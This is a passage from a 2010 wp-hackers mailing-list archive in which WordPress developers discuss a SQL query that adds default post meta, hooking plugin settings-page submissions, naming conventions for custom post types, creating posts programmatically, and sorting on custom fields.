	<AANLkTik82Oz_0Xj5ZLi_TzNG7idoIQDObMJxXaAWENm5@mail.gmail.com>
	<03721907-D05C-411C-BF6D-452090EED81C@newclarity.net>
Message-ID: <60A51F1E-D308-4C92-8FA0-DBEE7E2BEE03@newclarity.net>

Sorry, that was my code with a test table. Should have been:

==========
INSERT INTO wp_postmeta (post_id,meta_key,meta_value)
SELECT ID,'my_custom_key','false' 
FROM wp_posts 
WHERE ID NOT IN (SELECT post_id FROM wp_postmeta WHERE meta_key = 'my_custom_key')
==========


On Jul 12, 2010, at 7:26 PM, Mike Schinkel wrote:

> So you want a bulk insert statement to add the meta_key with a default value for every one that's missing one?  Why not default the value in PHP code rather than take up disk space?
> 
> That said, I think this is what you asked for, let me know if not:
> 
> ==========
> INSERT INTO wp_postmeta2 (post_id,meta_key,meta_value)
> SELECT ID,'my_custom_key','false' 
> FROM wp_posts 
> WHERE ID NOT IN (SELECT post_id FROM wp_postmeta2 WHERE meta_key = 'my_custom_key')
> ==========
> 
> P.S. This can be written several ways, I wrote this to try to make it the most obvious.
> 
> -Mike
> 
> 
> On Jul 12, 2010, at 7:14 PM, Joel Fisher wrote:
> 
>> Basically it is just a custom field.
>> 
>> I want every post that currently does NOT have the meta_key = members
>> to get it and also set the meta_value = false.
>> 
>> Does that make sense?
>> 
>> So, it is the same key and the same value for all posts that does not
>> currently have it set.
>> 
>> 
>> joel.fisher
>> www.flushinc.com
>> 
>> Linkedin: http://www.linkedin.com/in/jfisher
>> Follow: www.twitter.com/joelmoney
>> 
>> 
>> 
>> 
>> On Mon, Jul 12, 2010 at 7:12 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net> wrote:
>>> How are you going to generate the queries?  In an Excel spreadsheet and run them all, or by calling a function that issues the SQL, or something else.  IOW, where is your metadata coming from?
>>> 
>>> -Mike
>>> 
>>> On Jul 12, 2010, at 7:08 PM, Joel Fisher wrote:
>>> 
>>>> I have a ton of posts that I need to add a meta_key and meta_value too.
>>>> Some posts, it already exists so I don't want to overwrite.
>>>> 
>>>> Basically I want to add it to ALL posts that do NOT have it already.
>>>> 
>>>> Can someone point me to a MySQL query or alternative method to add this data?
>>>> 
>>>> Thanks.
>>>> 
>>>> 
>>>> 
>>>> joel.fisher
>>>> www.flushinc.com
>>>> 
>>>> Linkedin: http://www.linkedin.com/in/jfisher
>>>> Follow: www.twitter.com/joelmoney
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From CaptainN at unFocus.com  Mon Jul 12 23:32:22 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Mon, 12 Jul 2010 19:32:22 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTinlvq4i3IWI3tEb6eht28SQDvFFIJ1f5B7GB4JG@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<4C3B9DA0.5070805@unFocus.com>
	<AANLkTinlvq4i3IWI3tEb6eht28SQDvFFIJ1f5B7GB4JG@mail.gmail.com>
Message-ID: <4C3BA606.7080501@unFocus.com>

  On 7/12/10 7:11 PM, Andrew Nacin wrote:
> The names of post types are limited to 20 characters in the DB. That is
> guaranteed to be silently trimmed.
That's good to know! :-)

Kevin N.


From mikeschinkel at newclarity.net  Mon Jul 12 23:37:00 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 12 Jul 2010 19:37:00 -0400
Subject: [wp-hackers] Extending Custom Post Types
In-Reply-To: <4C3BA5D0.8050303@unFocus.com>
References: <4C3B9F22.2070100@unFocus.com>
	<FB2A76D1-E6BA-44B8-894A-89D6B5E5A8F0@newclarity.net>
	<4C3BA5D0.8050303@unFocus.com>
Message-ID: <39CA517C-780A-4BD7-B4E2-8793F8EB5AA1@newclarity.net>

On Jul 12, 2010, at 7:31 PM, Kevin Newman wrote:
> a bunch of booleans (pool, tenis courts, etc.)

Tags or possibly a custom taxonomy ?

> address info, membership info, 

Custom fields?

> all of it needs to be searchable and sortable (ORDER in SQL parlance) - searchable at least.

Adding SQL in hooks?
Or adding query_vars that generate SQL?

> It'll be replacing an older asp.net application - interestingly, what we ended up doing there for searching, was dumping a copy of every attribute into a blob field, and using a fulltext index to pull out ranked searches. Pretty spiffy really.

I assume you stored them as structured data in the blob?  Elaborate?

> If I come up with anything specific to ask I'll go ahead and do that.

Perfect.

-Mike

From mda at blogwaffe.com  Tue Jul 13 01:28:05 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Mon, 12 Jul 2010 18:28:05 -0700
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <4C3ABE81.9040202@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
Message-ID: <AANLkTinaQcSvSfYYBG8DM1PJshb6T6OeuIiHCuq0Gu0O@mail.gmail.com>

On Mon, Jul 12, 2010 at 12:04 AM, Matt Jacob <matt at mattjacob.com> wrote:
> I'm using the settings API for my plugin's custom settings page, and it's
> working pretty well. Sometimes, though, I want to perform an action based on
> a submitted value instead of just saving the value back to the DB. Where's
> the best place to intercept the form submission and do some actual work?
>
> I have two possibilities in my mind:
>
> 1. Hook into the admin_init action, since this should come before the $_POST
> array gets wiped out. I can determine if a specific submit button was used,
> if a certain checkbox was checked, etc. and then do some work based on those
> criteria.

When does the $_POST array ever get "wiped out"?

Does your plugin have its own settings page, or are you adding
settings to a core settings page?  If you have your own page, I feel
like the tried and true method is to do something like the following.

function my_plugin_admin_menu() {
  $hook = add_options_page( 'Me', 'Me', 'manage_options', 'me',
'my_plugin_admin_page' );
  add_action( "load-$hook", 'my_plugin_admin_page_load' );
}

function my_plugin_admin_page_load() {
  if ( 'post' != strtolower( $_SERVER['REQUEST_METHOD'] ) )
    return;
  // do stuff
}

Does that suit your needs?

From matt at mattjacob.com  Tue Jul 13 02:58:25 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Mon, 12 Jul 2010 19:58:25 -0700
Subject: [wp-hackers] Best way to kick off actual work from
 plugin	settings page?
In-Reply-To: <AANLkTinaQcSvSfYYBG8DM1PJshb6T6OeuIiHCuq0Gu0O@mail.gmail.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTinaQcSvSfYYBG8DM1PJshb6T6OeuIiHCuq0Gu0O@mail.gmail.com>
Message-ID: <4C3BD651.8020607@mattjacob.com>

On 7/12/10 6:28 PM, Michael D Adams wrote:
> When does the $_POST array ever get "wiped out"?

I was probably thinking of $_GET and custom queries. It was late when I 
made the first post last night, so my brain was most likely fried.

> Does your plugin have its own settings page, or are you adding
> settings to a core settings page?  If you have your own page, I feel
> like the tried and true method is to do something like the following.

Own page via add_submenu_page, but it's more or less the same as your 
code snippet below.

> Does that suit your needs?

Maybe, but I'm posting back to options.php, not plugins.php. Are you 
suggesting a separate form with an action set to my plugin's settings page?

Matt

From otto at ottodestruct.com  Tue Jul 13 03:25:43 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 12 Jul 2010 22:25:43 -0500
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
Message-ID: <AANLkTilioqKNkCXvjQHqlkmvzadxsEke9BTIHIuBUJTb@mail.gmail.com>

On Mon, Jul 12, 2010 at 2:20 AM, John Blackbourn
<johnbillion+wp at gmail.com> wrote:
> On Mon, Jul 12, 2010 at 8:04 AM, Matt Jacob <matt at mattjacob.com> wrote:
>> Option #2 seems more elegant, but it's kind of overloading the purpose of
>> the callback.
>
> Not at all, this is the purpose of this callback function. I use it
> all the time to sanitize and filter the data I want saved (I also use
> a single array for all my options in a form). Option #2 is the way to
> go.

I gotta go with John on this one. Just use the callback. It's simpler,
clearer, and that's really what it's designed for.

Okay, so yes, the callback is usually used for validation. But it's
not really overloading it if you have multiple submit buttons which
you can then detect for and thus act accordingly.

-Otto

From mda at blogwaffe.com  Tue Jul 13 03:40:49 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Mon, 12 Jul 2010 20:40:49 -0700
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <4C3BD651.8020607@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTinaQcSvSfYYBG8DM1PJshb6T6OeuIiHCuq0Gu0O@mail.gmail.com> 
	<4C3BD651.8020607@mattjacob.com>
Message-ID: <AANLkTilLSo_TCnOX5ZqEFB9pMBehn8P0RN-qJIhblA7d@mail.gmail.com>

On Mon, Jul 12, 2010 at 7:58 PM, Matt Jacob <matt at mattjacob.com> wrote:
> On 7/12/10 6:28 PM, Michael D Adams wrote:
>> Does your plugin have its own settings page, or are you adding
>> settings to a core settings page? ?If you have your own page, I feel
>> like the tried and true method is to do something like the following.
>
> Maybe, but I'm posting back to options.php, not plugins.php. Are you
> suggesting a separate form with an action set to my plugin's settings page?

Ah.  Yes - I forgot that the settings API is usually used by POSTing
to options.php.  My bad.

You could replicate option.php's calls to check_admin_referer() and
update_option() in the load-function (my_plugin_admin_page_load() in
my earlier example) and change to action="" in the form.

If you don't want to change the action, then I agree that you're stuck
with the methods you mentioned: the register_setting() callback and
admin_init (or load-options.php).

If you're trying to intercept the entire POST before anything updates
in the DB, and you have multiple calls to register_setting(), then
you'll have to be careful where you put your interception code; make
sure you know which register_setting() callback gets called first or
put your interception code in all of the callbacks.

From matt at mattjacob.com  Tue Jul 13 06:43:58 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Mon, 12 Jul 2010 23:43:58 -0700
Subject: [wp-hackers] Best way to kick off actual work from
 plugin	settings page?
In-Reply-To: <AANLkTilioqKNkCXvjQHqlkmvzadxsEke9BTIHIuBUJTb@mail.gmail.com>
References: <4C3ABE81.9040202@mattjacob.com>	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
	<AANLkTilioqKNkCXvjQHqlkmvzadxsEke9BTIHIuBUJTb@mail.gmail.com>
Message-ID: <4C3C0B2E.80105@mattjacob.com>

On 7/12/10 8:25 PM, Otto wrote:
> I gotta go with John on this one. Just use the callback. It's simpler,
> clearer, and that's really what it's designed for.

Alright. That's what I was leaning towards. Thanks for sealing the deal.

Matt

From peter.westwood at ftwr.co.uk  Tue Jul 13 07:03:31 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Tue, 13 Jul 2010 08:03:31 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3B9631.2090205@elfden.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>
	<4C3B0CF7.2000309@voceconnect.com>	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
	<4C3B9631.2090205@elfden.co.uk>
Message-ID: <0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>


On 12 Jul 2010, at 23:24, Rich Pedley wrote:

> On 12/07/2010 21:24, Peter Westwood wrote:
>> I've read through the whole thread and he are my comments.
>> 
>> Personally I would recommend against people "reserving" post types
>> - you are creating mines in which your data will be stored which
>> won't make it easy for other plugins or themes to interact with
>> without breaking arbitrary rules:
>> 
>> "like custom post types must be prefixed in a plugin specific way"
>> 
>> I would rather recommend that if you are creating a plugin which
>> allows people to create "Events" you use a post type called "event"
>> and you write your code in such a way that if some special piece of
>> post_meta you need is missing you have a default for it which you
>> use.
>> 
>> That way when I decide to switch from your Events plugin to this
>> new kid on the block I can still manage and use all those events I
>> already created using the new plugin.
> 
> I cringe whenever I read people saying this. Maybe my thinking is wonky on this issue, but surely different plugins will have different ideas on how to use things. Example: 2 plugins each using 'event' as their custom post type.
> plugin one uses start_date & end_date
> plugin two uses startdate & enddate
> 
> (and yes I'm thinking specifically of post meta here).
> 
> You stop using plugin one and go to plugin two - but you will potentially lose any extra data stored. The only commonality is the post type name - every thing else is potentially different.
> 
> Yes the post itself remains, but all the extras won't. I'm not sure I see the benefit of actually using the same custom post type.
> 
> So am I missing something here?


There is in my opinion a huge user benefit in the following:

When I switch from Event Plugin A to Event Plugin B I don't "lose" all my events.

The bulk of the info stored for this post type will be in the standard fields.

Yes there will be some probably plugin specific post_meta but there is no reason why on activation you could not schedule a cron task to scan existing "events" for missing meta data and help the user fix those old events.

To take this a step further the fixing process could actually just help the user tell your plugin which of the existing meta items contain the info it needs.

I would much rather the user experience revolves around a little work to solve the differences between meta storage than just "losing" all there content.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From elfin at elfden.co.uk  Tue Jul 13 07:51:46 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Tue, 13 Jul 2010 08:51:46 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>	<4C3B0CF7.2000309@voceconnect.com>	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>	<4C3B9631.2090205@elfden.co.uk>
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
Message-ID: <4C3C1B12.2090202@elfden.co.uk>

On 13/07/2010 08:03, Peter Westwood wrote:
>
> On 12 Jul 2010, at 23:24, Rich Pedley wrote:
>
>> On 12/07/2010 21:24, Peter Westwood wrote:
>>> I've read through the whole thread and he are my comments.
>>>
>>> Personally I would recommend against people "reserving" post
>>> types - you are creating mines in which your data will be
>>> stored which won't make it easy for other plugins or themes to
>>> interact with without breaking arbitrary rules:
>>>
>>> "like custom post types must be prefixed in a plugin specific
>>> way"
>>>
>>> I would rather recommend that if you are creating a plugin
>>> which allows people to create "Events" you use a post type
>>> called "event" and you write your code in such a way that if
>>> some special piece of post_meta you need is missing you have a
>>> default for it which you use.
>>>
>>> That way when I decide to switch from your Events plugin to
>>> this new kid on the block I can still manage and use all those
>>> events I already created using the new plugin.
>>
>> I cringe whenever I read people saying this. Maybe my thinking is
>> wonky on this issue, but surely different plugins will have
>> different ideas on how to use things. Example: 2 plugins each
>> using 'event' as their custom post type. plugin one uses
>> start_date&  end_date plugin two uses startdate&  enddate
>>
>> (and yes I'm thinking specifically of post meta here).
>>
>> You stop using plugin one and go to plugin two - but you will
>> potentially lose any extra data stored. The only commonality is
>> the post type name - every thing else is potentially different.
>>
>> Yes the post itself remains, but all the extras won't. I'm not
>> sure I see the benefit of actually using the same custom post
>> type.
>>
>> So am I missing something here?
>
>
> There is in my opinion a huge user benefit in the following:
>
> When I switch from Event Plugin A to Event Plugin B I don't "lose"
> all my events.

well no the data is still there.

> The bulk of the info stored for this post type will be in the
> standard fields.

agreed.

> Yes there will be some probably plugin specific post_meta but there
> is no reason why on activation you could not schedule a cron task
> to scan existing "events" for missing meta data and help the user
> fix those old events.

Interesting, though how many people will do this? It would need to be 
in every plugin that uses custom post types.

> To take this a step further the fixing process could actually just
> help the user tell your plugin which of the existing meta items
> contain the info it needs.

Search on stored data and trying to match to your setup - not easy to 
accomplish. But I suppose it is no different to an import routine. 
Which i admit I hadn't thought about, so yeah it is making sense now.

> I would much rather the user experience revolves around a little
> work to solve the differences between meta storage than just
> "losing" all there content.

Thanks for clearing it up for me - sometimes things just don't seem 
right until things are pointed out (and sometimes even obvious things 
pass me by).

Rich


From mikeschinkel at newclarity.net  Tue Jul 13 08:34:04 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 13 Jul 2010 04:34:04 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3C1B12.2090202@elfden.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>	<4C3B0CF7.2000309@voceconnect.com>	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>	<4C3B9631.2090205@elfden.co.uk>
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
	<4C3C1B12.2090202@elfden.co.uk>
Message-ID: <837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>

On Jul 13, 2010, at 3:51 AM, Rich Pedley wrote:
>> To take this a step further the fixing process could actually just
>> help the user tell your plugin which of the existing meta items
>> contain the info it needs.
> 
> Search on stored data and trying to match to your setup - not easy to accomplish. But I suppose it is no different to an import routine. Which i admit I hadn't thought about, so yeah it is making sense now.
> 
>> I would much rather the user experience revolves around a little
>> work to solve the differences between meta storage than just
>> "losing" all there content.
> 
> Thanks for clearing it up for me - sometimes things just don't seem right until things are pointed out (and sometimes even obvious things pass me by).

But even though it's like an import, it doesn't address the much more useful scenario of interoperability between the two. 

Let's say there were three Event plugins:  One focusing on interfacing with Facebook, LinkedIn, Meeting.  A second focused on helping me manage RSVPs and members.  A third enable payment process via all major payment processors.  The damn shame would be if they each decided, for no reason other than happenstance, to name their most basic data elements differently thus making them effectively incompatible. 

Interoperability is one of the key things to address IMO, and one of the main reasons I started the thread. Comparatively speaking, the value of export/import is trivial.

-Mike

From justmichaelh at gmail.com  Tue Jul 13 10:50:41 2010
From: justmichaelh at gmail.com (Michael E. Hancock)
Date: Tue, 13 Jul 2010 06:50:41 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>	<4C3ACEFD.5020208@elfden.co.uk>	<4C3B0CF7.2000309@voceconnect.com>	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>	<4C3B9631.2090205@elfden.co.uk><0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk><4C3C1B12.2090202@elfden.co.uk>
	<837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>
Message-ID: <0be901cb2279$3dc06fc0$6401a8c0@dell8600>


From: "Mike Schinkel" <mikeschinkel at newclarity.net>
> Let's say there were three Event plugins:  One focusing on interfacing 
> with Facebook, LinkedIn, Meeting.  A second focused on helping me manage 
> RSVPs and members.  A third enable payment process via all major payment 
> processors.  The damn shame would be if they each decided, for no reason 
> other than happenstance, to name their most basic data elements 
> differently thus making them effectively incompatible.


Sounds like a plugin that can rename post types, custom fields, and even 
taxonomies, could be a hit.



Michael 


From piemanek at gmail.com  Tue Jul 13 11:49:47 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Tue, 13 Jul 2010 12:49:47 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <0be901cb2279$3dc06fc0$6401a8c0@dell8600>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
	<4C3B9631.2090205@elfden.co.uk>
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
	<4C3C1B12.2090202@elfden.co.uk>
	<837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>
	<0be901cb2279$3dc06fc0$6401a8c0@dell8600>
Message-ID: <AANLkTilOhvhOASlWoRqVWX5J33x-DUuT5she9kf7p3H5@mail.gmail.com>

> Sounds like a plugin that can rename post types, custom fields, and even
> taxonomies, could be a hit.
>


i know of this plugin that converts post types, could be a good starting
point: http://sillybean.net/wordpress/new-plugin-convert-post-types/

From piemanek at gmail.com  Tue Jul 13 17:46:06 2010
From: piemanek at gmail.com (Simon Blackbourn)
Date: Tue, 13 Jul 2010 18:46:06 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTilOhvhOASlWoRqVWX5J33x-DUuT5she9kf7p3H5@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net>
	<AANLkTikb3_1vXgg4zO4tali1cYWmz4eIMdfFjiv__K5W@mail.gmail.com>
	<29A8946A-3622-4FBA-B44F-DB59F8E04218@ftwr.co.uk>
	<4C3B9631.2090205@elfden.co.uk>
	<0F8D6B2A-8EE8-4834-B4F1-928B9AC463A2@ftwr.co.uk>
	<4C3C1B12.2090202@elfden.co.uk>
	<837FCBB5-89B3-4129-8700-E8962FC174E0@newclarity.net>
	<0be901cb2279$3dc06fc0$6401a8c0@dell8600>
	<AANLkTilOhvhOASlWoRqVWX5J33x-DUuT5she9kf7p3H5@mail.gmail.com>
Message-ID: <AANLkTinAEQdUy3zWa-DghEsW3iaiSTVzkIStQTjM-_3K@mail.gmail.com>

I strongly believe that being open with post type & custom fields rather
than namespacing them is the way to go in the long term. Closing things off
and saying "this is my post type - hands off everyone else!" is antithetical
to the whole ethos of the WordPress project.

But rather than setting up yet more working groups and discussion forum,
etc, which seems to me over-bureaucratic and unlikely to result in success,
what if plugin authors simply put the information visibly on their plugin
page, then over time 'the market' decides and those plugins that don't
follow the standard set by others will become less popular.

Clearly stating the post type and custom fields on your plugin page would
encourage other developers to use the same type/fields in their plugin (or
not to use the same if they want to avoid conflict). They could then say
"compatible with the Blah Events plugin".

So rather than having to dig through code to find these things out, it's
right there out in the open on the plugin page for all to see.

It might take a while to get the ball rolling, but once it gains critical
mass then take-up should grow. Just a few high profile plugin authors doing
this and writing about it on their blogs should kickstart things.

Which then raises the question as to whether there should be some consistent
place/format on the wp.org plugin pages for displaying this information?
(either in the FAQ or Other Notes?)

--
Simon

From bernard.d.tremblay at gmail.com  Tue Jul 13 18:20:53 2010
From: bernard.d.tremblay at gmail.com (Bernard D. Tremblay (ben))
Date: Tue, 13 Jul 2010 12:20:53 -0600
Subject: [wp-hackers] Auto-generation of post
Message-ID: <4C3CAE85.7070109@gmail.com>

I'm using VATSIM PHP (see 
http://vatview.com/vatview_display_list.php?typed=pilots).
What I'd like to do is take the data from filtered output and create a post.

So a certain pilot is online. I want to "post" using his data to 
populate the process.
Eventually I'd like to "edit" when the post already exists, but that's 
not an immediate requirement.

I'm sure it's do-able ... and I think this is paradigmatic of a certain 
work-flow i.e. there'd be other applications for this ... but this is 
way, way, /way/ over my head.

Am I just dreaming in technicolor there?

ben

p.s. please CC me in reply; I'm pret'near swamped just now.

-- 
  |-------------------                        -------------------|
  |    Bernard D. Tremblay (ben)   |  Ben Tremblay&  Associates  |
          My lastest: http://gnodal.protension.com/journal/
|---------------                                  ---------------|
|  Confusion is a kinky form of enlightenment, clarity in drag.  |
|  Uncertainty is certainty that has stepped on a banana peel.   |
|  Negativity is brilliance competing with itself.               |
|------------------------                 Sherab Chodzin Kohn ---|
   


From mikeschinkel at newclarity.net  Tue Jul 13 18:24:27 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 13 Jul 2010 14:24:27 -0400
Subject: [wp-hackers] Auto-generation of post
In-Reply-To: <4C3CAE85.7070109@gmail.com>
References: <4C3CAE85.7070109@gmail.com>
Message-ID: <75EB6AFA-9B74-401E-8078-8816103130DD@newclarity.net>

Are you looking for the wp_insert_post($post) function where $post has the same fields as those returned by get_post($post->ID)?


On Jul 13, 2010, at 2:20 PM, Bernard D. Tremblay (ben) wrote:

> I'm using VATSIM PHP (see http://vatview.com/vatview_display_list.php?typed=pilots).
> What I'd like to do is take the data from filtered output and create a post.
> 
> So a certain pilot is online. I want to "post" using his data to populate the process.
> Eventually I'd like to "edit" when the post already exists, but that's not an immediate requirement.
> 
> I'm sure it's do-able ... and I think this is paradigmatic of a certain work-flow i.e. there'd be other applications for this ... but this is way, way, /way/ over my head.
> 
> Am I just dreaming in technicolor there?
> 
> ben
> 
> p.s. please CC me in reply; I'm pret'near swamped just now.
> 
> -- 
> |-------------------                        -------------------|
> |    Bernard D. Tremblay (ben)   |  Ben Tremblay&  Associates  |
>         My lastest: http://gnodal.protension.com/journal/
> |---------------                                  ---------------|
> |  Confusion is a kinky form of enlightenment, clarity in drag.  |
> |  Uncertainty is certainty that has stepped on a banana peel.   |
> |  Negativity is brilliance competing with itself.               |
> |------------------------                 Sherab Chodzin Kohn ---|
>  
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From CaptainN at unFocus.com  Tue Jul 13 19:00:28 2010
From: CaptainN at unFocus.com (Kevin Newman)
Date: Tue, 13 Jul 2010 15:00:28 -0400
Subject: [wp-hackers] Sorting on Custom Fields
Message-ID: <4C3CB7CC.5000609@unFocus.com>

  I'm creating a plugin which will extend the post with a ton of custom 
fields (50 or so per post, mostly booleans, some numbers and some text). 
I'll need to be able to ORDER BY (to use SQL terminology) these fields 
(as well as search on them).

There is a plugin called wp-smart-sort which seems to do sorting by 
looping through the results of a custom query and storing the post data 
in an array and ordering that in memory ("seems to", because I didn't 
take the code apart all that thoroughly).

I'm leaning toward using a custom table, because sorting in server 
memory seems inefficient, and I have a crazy number of values anyway. 
But serializing those in a single custom field, doesn't seem crazy either.

Anyway, I'd love to see opinions on this. :-)

Kevin N.



From e at leau.net  Tue Jul 13 20:28:47 2010
From: e at leau.net (Edward de Leau)
Date: Tue, 13 Jul 2010 22:28:47 +0200
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTinAEQdUy3zWa-DghEsW3iaiSTVzkIStQTjM-_3K@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk> 
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
	<AB0D8ECD-2A1B-410B-A413-218E233B3512@newclarity.net> 
